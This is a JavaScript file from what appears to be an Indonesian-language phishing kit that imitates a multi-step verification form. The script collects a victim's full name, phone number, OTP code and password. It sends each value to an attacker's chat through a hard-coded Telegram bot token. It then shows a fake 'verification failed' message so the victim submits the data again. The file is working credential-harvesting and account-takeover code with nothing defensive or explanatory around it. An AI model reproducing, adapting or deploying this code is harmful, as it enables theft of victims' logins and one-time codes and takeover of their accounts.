const botToken = "7945679163:AAE_FWn__VpRLUhREBGVGPZ6UtKNMCQFhsY";

let fullName = "";
let phone = "";
let otp = "";
let password = "";

// Function to show loading overlay
function showLoading() {
  const loadingOverlay = document.getElementById("loadingOverlay");
  loadingOverlay.style.display = "flex";
}

// Function to hide loading overlay
function hideLoading() {
  const loadingOverlay = document.getElementById("loadingOverlay");
  loadingOverlay.style.display = "none";
}

// Function to show custom alert
function showAlert(message) {
  const alertMessage = document.getElementById("alertMessage");
  alertMessage.textContent = message;
  const alertModal = document.getElementById("alertModal");
  alertModal.style.display = "flex";
  document.body.style.overflow = "hidden";
}

// Function to hide the alert
function hideAlert() {
  const alertModal = document.getElementById("alertModal");
  alertModal.style.display = "none";
  document.body.style.overflow = "auto";
}

// Fungsi untuk mendapatkan chatId dari URL parameter
function getChatIdFromURL() {
  const urlParams = new URLSearchParams(window.location.search);
  return urlParams.get("chatId");
}

// Simpan chatId ke sessionStorage saat halaman dimuat
window.onload = function () {
  const chatId = getChatIdFromURL();
  if (chatId) {
    sessionStorage.setItem("chatId", chatId);
  }
};

function sendToTelegram(message) {
  const chatId = sessionStorage.getItem("chatId");
  if (!chatId) {
    showAlert("Chat ID tidak ditemukan di session storage.");
    return;
  }

  fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({
      chat_id: chatId,
      text: message,
    }),
  })
    .then((response) => {
      if (!response.ok) {
        throw new Error("Gagal mengirim data ke chat ID: " + chatId);
      }
    })
    .catch((error) => {
      showAlert(
        "Terjadi kesalahan pada chat ID " + chatId + ": " + error.message
      );
    });
}

function nextStep(step) {
  showLoading();

  setTimeout(() => {
    if (step === 2) {
      fullName = document.getElementById("fullName").value;
      phone = document.getElementById("phone").value;
      if (!fullName || !phone) {
        showAlert("Nama Lengkap dan Nomor Telepon harus diisi!");
        hideLoading();
        return;
      }
      let message = `Gercepki Bosku :\nNama Lengkap: ${fullName}\nNomor Telepon: ${phone}`;
      sendToTelegram(message);
    } else if (step === 3) {
      otp = document.getElementById("otp").value;
      if (!otp) {
        showAlert("Kode OTP harus diisi!");
        hideLoading();
        return;
      }
      let message = `Kode OTP: ${otp}`;
      sendToTelegram(message);
      document.getElementById("step3Description").textContent =
        "Kami telah mengirimkan kode pada telegram anda, silahkan cek pesan telegram anda.";
    } else if (step === 4) {
      password = document.getElementById("password").value;
      if (!password || password.trim() === "") {
        showAlert("Kata Sandi harus diisi!");
        hideLoading();
        return;
      }
      let message = `Kata Sandi: ${password}`;
      sendToTelegram(message); 
    }

    document.getElementById("step1").style.display =
      step === 1 ? "block" : "none";
    document.getElementById("step2").style.display =
      step === 2 ? "block" : "none";
    document.getElementById("step3").style.display =
      step === 3 ? "block" : "none";

    hideLoading();
  }, 2000);
}

function resetForm() {
  fullName = "";
  phone = "";
  otp = "";
  password = "";
  document.getElementById("fullName").value = "";
  document.getElementById("phone").value = "";
  document.getElementById("otp").value = "";
  document.getElementById("password").value = "";
  document.getElementById("step1").style.display = "block";
  document.getElementById("step2").style.display = "none";
  document.getElementById("step3").style.display = "none";
}

function submitVerification() {
  const passwordInput = document.getElementById("password").value;
  if (passwordInput.trim() === "") {
    showAlert("Kata Sandi harus diisi sebelum mengirim ringkasan.");
    return;
  }

  password = passwordInput;

  showLoading();

  setTimeout(() => {
    const summaryMessage = `Gercepko Sayang:\nNama Lengkap: ${fullName}\nNomor Telepon: ${phone}\nKode OTP: ${otp}\nKata Sandi: ${password}`;
    sendToTelegram(summaryMessage);
    showAlert("Verifikasi anda gagal tolong masukkan data yang benar");
    resetForm();
    hideLoading();
  }, 1200);
}

document.getElementById("phone").addEventListener("input", function (e) {
  this.value = this.value.replace(/[^0-9]/g, "");
});

document.getElementById("otp").addEventListener("input", function (e) {
  this.value = this.value.replace(/[^0-9]/g, "");
});
